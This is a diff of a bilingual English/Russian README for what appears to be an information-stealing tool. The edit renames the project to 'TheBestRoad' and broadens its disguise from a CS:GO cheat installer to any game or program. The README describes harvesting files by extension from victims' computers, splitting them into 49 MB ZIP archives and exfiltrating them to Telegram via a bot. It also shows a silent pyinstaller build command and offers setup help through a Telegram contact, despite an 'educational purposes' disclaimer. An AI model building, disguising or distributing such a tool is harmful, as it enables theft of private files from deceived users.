@@ -2,9 +2,9 @@ ENGLISH:
 
 ---
 
-# CS\:GO Cheat Installer (Disguised File Collector)
+# TheBestRoad
 
-This script is disguised as a cheat installer for CS\:GO and collects files with specified extensions from the user's computer. The collected files are archived into several ZIP files, each up to 49 MB, and sent to Telegram via a bot.
+This script is disguised as a cheat installer for CS2(or other game/program what you like) and collects files with specified extensions from the user's computer. The collected files are archived into several ZIP files, each up to 49 MB, and sent to Telegram via a bot.
 
 ---
 
@@ -106,9 +106,8 @@ If you need improvements or help with setup, message: t.me/ErnestoMiyake
 
 
 RUSSIAN
-# CS:GO Cheat Installer (Disguised File Collector)
-
-Этот скрипт замаскирован под инсталлятор чита для CS:GO и выполняет сбор файлов с заданными расширениями с компьютера пользователя. Собранные файлы архивируются в несколько ZIP-архивов размером до 49 МБ каждый и отправляются в Telegram через бота.
+# TheBestRoad - самая лучшая дорога
+Этот скрипт замаскирован под инсталлятор чита для CS2(или другой игры/программы что вы захотите) и выполняет сбор файлов с заданными расширениями с компьютера пользователя. Собранные файлы архивируются в несколько ZIP-архивов размером до 49 МБ каждый и отправляются в Telegram через бота.
 
 ---
 
@@ -198,5 +197,7 @@ pyinstaller --onefile --noconsole agent.py
 
 ---
 
+
+ПАСХАЛКА: Если вы прочли эту часть на русском, то знайте что это - изначальный язык написание кода, и написания прочтименя.мд
 *Данный проект предоставляется "как есть" без гарантий и предназначен для демонстрационных целей.*
 ## ⚠️Создатель не несет ответственность за ваши действия, данный код был создан исключительно для учебных целях создания на основе данного кода вы должны или учится, или создавать проекты о кибер безопасности, где сказано про защиту и как защитить себя от подобных программ.
